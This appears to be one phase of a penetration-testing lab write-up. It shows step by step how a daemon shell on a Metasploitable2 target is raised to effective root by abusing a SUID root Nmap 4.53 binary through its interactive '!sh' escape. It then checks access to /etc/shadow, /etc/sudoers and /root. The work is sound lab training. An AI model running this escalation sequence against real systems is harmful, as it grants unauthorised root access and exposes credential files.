# 08 — Privilege Escalation Commands

## Objective

Validate whether the root-owned SUID installation of Nmap 4.53 identified during post-exploitation can be abused to obtain elevated effective privileges.

The purpose of this phase is to demonstrate the practical impact of the insecure SUID configuration while minimizing modifications to the target system.

---

## Starting Context

| Property              | Value                   |
| --------------------- | ----------------------- |
| Target                | Metasploitable2         |
| Target IP             | `192.168.56.107`        |
| Initial Access Vector | distccd — CVE-2004-2687 |
| Compromised Account   | `daemon`                |
| UID                   | `1`                     |
| Initial Privilege     | Unprivileged            |
| Escalation Candidate  | `/usr/bin/nmap`         |
| Nmap Version          | `4.53`                  |
| SUID Owner            | `root`                  |

The privilege escalation attempt begins from the previously established `daemon` command shell.

---

# 1. Candidate Verification

Before attempting privilege escalation, the previously identified Nmap binary was reviewed.

## Verify Permissions

```bash
ls -lah /usr/bin/nmap
```

### Purpose

Confirms the ownership and permission bits associated with the Nmap executable.

The security-relevant condition identified during post-exploitation was a root-owned Nmap binary with the SUID permission bit enabled.

---

## Verify Version

```bash
nmap --version
```

### Purpose

Confirms the installed Nmap version before testing functionality associated with the identified privilege escalation candidate.

The installed version was identified as:

```text
Nmap 4.53
```

---

# 2. Interactive Nmap Mode

Nmap was started using its legacy interactive mode.

```bash
nmap --interactive
```

### Purpose

Starts the interactive interface available in the installed legacy Nmap version.

Because the Nmap executable is configured with SUID root permissions, functionality executed from this context requires security validation.

---

# 3. Shell Execution

From the Nmap interactive prompt:

```text
!sh
```

### Purpose

Requests execution of a system shell from within the Nmap interactive environment.

The resulting shell is then independently inspected to determine whether elevated effective privileges were inherited from the SUID Nmap process.

---

# 4. Privilege Verification

Obtaining a shell alone does not prove successful privilege escalation.

The resulting security context was therefore verified using multiple commands.

## Username

```bash
whoami
```

### Purpose

Displays the effective username associated with the resulting shell.

---

## Identity Information

```bash
id
```

### Purpose

Displays the real and effective identity information associated with the shell.

This distinction is particularly important for SUID-based privilege escalation.

The observed identity is documented in:

```text
results.md
```

---

# 5. Effective UID Interpretation

The privilege escalation resulted in a distinction between the real UID and effective UID.

The original compromised account remains:

```text
daemon
UID 1
```

while the resulting process receives an effective identity associated with:

```text
root
EUID 0
```

Conceptually:

```text
distccd exploitation
        ↓
daemon
UID = 1
EUID = 1
        ↓
SUID /usr/bin/nmap
        ↓
Nmap interactive mode
        ↓
!sh
        ↓
daemon process with elevated effective identity
UID = 1
EUID = 0 (root)
```

The security impact therefore comes from the **effective root privileges** inherited through the SUID executable.

---

# 6. Privileged Access Validation

After confirming the elevated effective identity, access to resources that were unavailable to the original `daemon` shell was tested.

The objective is to demonstrate the practical impact of the privilege escalation without unnecessarily modifying the target.

---

## Shadow File Readability

```bash
test -r /etc/shadow && echo "SHADOW READABLE" || echo "SHADOW NOT READABLE"
```

### Purpose

Tests whether the elevated shell can read the protected shadow password database.

During post-exploitation, the original unprivileged `daemon` session could not read this resource.

A successful readability test therefore demonstrates a meaningful change in access after privilege escalation.

---

## Sudoers Readability

```bash
test -r /etc/sudoers && echo "SUDOERS READABLE" || echo "SUDOERS NOT READABLE"
```

### Purpose

Tests whether the elevated shell can read the protected sudo configuration.

This provides an additional comparison against the original unprivileged access boundary.

---

## Root Directory Permissions

```bash
ls -ld /root
```

### Purpose

Displays ownership and permissions associated with the root user's home directory.

---

## Root Directory Readability

```bash
test -r /root && echo "ROOT DIRECTORY READABLE" || echo "ROOT DIRECTORY NOT READABLE"
```

### Purpose

Tests whether the elevated shell can access the root user's home directory.

This provides additional evidence of the practical privileges available through the effective root identity.

---

# 7. Impact Validation Strategy

The privilege escalation is validated using several independent indicators:

```text
Nmap SUID root configuration
          ↓
Interactive mode available
          ↓
Shell execution through !sh
          ↓
whoami
          ↓
id
          ↓
EUID 0 (root)
          ↓
Protected resource access
```

This provides stronger evidence than relying solely on the appearance of a shell prompt.

---

# 8. Command Reference

The complete privilege escalation sequence used during this phase was:

```bash
ls -lah /usr/bin/nmap
nmap --version

nmap --interactive
```

From the Nmap interactive prompt:

```text
!sh
```

From the resulting shell:

```bash
whoami
id

test -r /etc/shadow && echo "SHADOW READABLE" || echo "SHADOW NOT READABLE"
test -r /etc/sudoers && echo "SUDOERS READABLE" || echo "SUDOERS NOT READABLE"

ls -ld /root
test -r /root && echo "ROOT DIRECTORY READABLE" || echo "ROOT DIRECTORY NOT READABLE"
```

---

# 9. Security Impact

The insecure configuration can be summarized as:

```text
Root-owned executable
        +
SUID permission
        +
Legacy Nmap interactive functionality
        ↓
Execution of a shell
        ↓
Effective UID 0
        ↓
Effective root privileges
```

The privilege escalation does not depend on obtaining another user's password or discovering sudo credentials.

Instead, the existing local SUID configuration provides the escalation path.

---

# 10. Evidence Handling

This phase benefits from concise visual evidence because the privilege transition is one of the primary findings of the laboratory.

Useful evidence includes a terminal view showing:

```text
nmap --interactive
!sh
whoami
id
```

The most important proof is the combination of:

```text
whoami → root
```

and:

```text
euid=0(root)
```

Additional evidence may demonstrate successful access to resources that were unavailable before escalation.

Screenshots should be stored under:

```text
evidence/
```

Raw terminal output, if preserved, can be stored under:

```text
scans/
```

There is no need to create separate screenshots for every readability test.

---

# 11. Cleanup

No persistent account, scheduled task, startup service, SSH key, or other persistence mechanism is created during this privilege escalation test.

The escalation is performed through the existing Nmap configuration.

After validation is complete, the elevated shell can be terminated using:

```bash
exit
```

This returns execution to the previous context.

The Nmap interactive session can subsequently be exited when testing is complete.

---

# 12. Phase Conclusion

The privilege escalation path demonstrated during this phase is:

```text
Remote distccd exploitation
          ↓
Unprivileged daemon shell
          ↓
Local enumeration
          ↓
Root-owned SUID Nmap 4.53 discovered
          ↓
Nmap interactive mode
          ↓
Shell execution
          ↓
EUID 0 (root)
          ↓
Effective root privileges
```

This completes the attack path from remote initial access to local privilege escalation.

---

## Next Step

Consolidate the findings from reconnaissance, enumeration, vulnerability research, exploitation, post-exploitation, and privilege escalation into the final assessment documentation.

The resulting report should clearly distinguish:

* Observed attack surface
* Confirmed vulnerabilities
* Security misconfigurations
* Initial access vectors
* Privilege escalation path
* Security impact
* Recommended remediation
